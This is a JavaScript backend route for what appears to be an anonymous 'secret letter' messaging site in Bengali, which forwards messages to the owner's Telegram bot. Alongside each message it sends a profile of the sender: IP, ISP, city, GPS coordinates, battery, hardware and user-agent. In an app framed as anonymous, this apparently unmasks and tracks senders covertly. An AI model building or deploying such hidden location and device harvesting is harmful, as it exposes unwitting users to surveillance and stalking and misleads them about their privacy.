// api/send.js — Secure Backend Route
// Bot Token never exposed to frontend

const RATE_MAP = new Map();

function rateLimit(ip) {
  const now = Date.now();
  const key = ip;
  const entry = RATE_MAP.get(key) || { count: 0, reset: now + 60000 };
  if (now > entry.reset) { entry.count = 0; entry.reset = now + 60000; }
  entry.count++;
  RATE_MAP.set(key, entry);
  return entry.count > 5; // max 5 messages per minute
}

function sanitize(str) {
  if (!str) return '';
  return String(str).replace(/[<>]/g, '').trim().slice(0, 2000);
}

module.exports = async (req, res) => {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', process.env.SITE_URL || '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Request-Token');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'Method not allowed' });

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress || 'unknown';
  if (rateLimit(ip)) return res.status(429).json({ ok: false, error: 'Too many requests. Please wait.' });

  const { uid, name, phone, fb, message, device } = req.body || {};

  if (!message || !message.trim()) return res.status(400).json({ ok: false, error: 'Message required' });
  if (message.trim().length < 2) return res.status(400).json({ ok: false, error: 'Message too short' });

  const BOT_TOKEN = process.env.BOT_TOKEN;
  const OWNER_ID  = process.env.OWNER_ID;
  if (!BOT_TOKEN || !OWNER_ID) return res.status(500).json({ ok: false, error: 'Server misconfigured' });

  const sName  = sanitize(name)  || '—';
  const sPhone = sanitize(phone) || '—';
  const sFb    = sanitize(fb)    || '—';
  const sMsg   = sanitize(message);
  const sUid   = sanitize(uid)   || '???';
  const dev    = device || {};

  const now = new Date().toLocaleString('en-US', { dateStyle: 'full', timeStyle: 'medium', timeZone: 'Asia/Dhaka' });

  const text =
`╔══════════════════════════════════╗
║  💌  গোপন চিঠি এসেছে!  💌  ║
╚══════════════════════════════════╝

🆔 User ID  ➜  #${sUid}
⏰ সময়      ➜  ${now}

━━━━━━━━ 👤 প্রেরকের তথ্য ━━━━━━━━
👤 নাম      : ${sName}
📱 Phone    : ${sPhone}
🔵 Facebook : ${sFb}

━━━━━━━━ 📱 Device Info ━━━━━━━━
📱 Model    : ${dev.model || '—'}
💻 OS       : ${dev.os || '—'}
🧠 RAM      : ${dev.ram || '—'}
⚙️ CPU      : ${dev.cpu || '—'}
📺 Screen   : ${dev.screen || '—'}
🔋 Battery  : ${dev.battery || '—'} ${dev.charging || ''}
🗣 Language : ${dev.lang || '—'}
🕐 Timezone : ${dev.tz || '—'}

━━━━━━━━ 🌐 Network & Location ━━━━━━━━
🌐 IP       : ${dev.ip || '—'}
🌍 Country  : ${dev.country || '—'}
📍 Division : ${dev.division || '—'}
🏙 City     : ${dev.city || '—'}
📶 ISP      : ${dev.isp || '—'}
${dev.lat ? `🗺 Coords   : ${dev.lat}, ${dev.lon}` : ''}

━━━━━━━━ 🕵️ User-Agent ━━━━━━━━
${(dev.ua || '—').slice(0, 150)}

╔══════════════════════════════════╗
║           💌 গোপন চিঠি           ║
╚══════════════════════════════════╝

${sMsg}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💬 /send ${sUid} [reply text]`;

  const keyboard = {
    inline_keyboard: [[
      { text: `💌 Reply #${sUid}`, callback_data: `reply_${sUid}` },
      { text: `📊 Info #${sUid}`,  callback_data: `info_${sUid}` }
    ]]
  };

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: OWNER_ID, text, reply_markup: keyboard })
    });
    const tgData = await tgRes.json();
    if (!tgData.ok) throw new Error(tgData.description);
    return res.status(200).json({ ok: true, msgId: tgData.result.message_id });
  } catch (e) {
    return res.status(500).json({ ok: false, error: 'Failed to send: ' + e.message });
  }
};
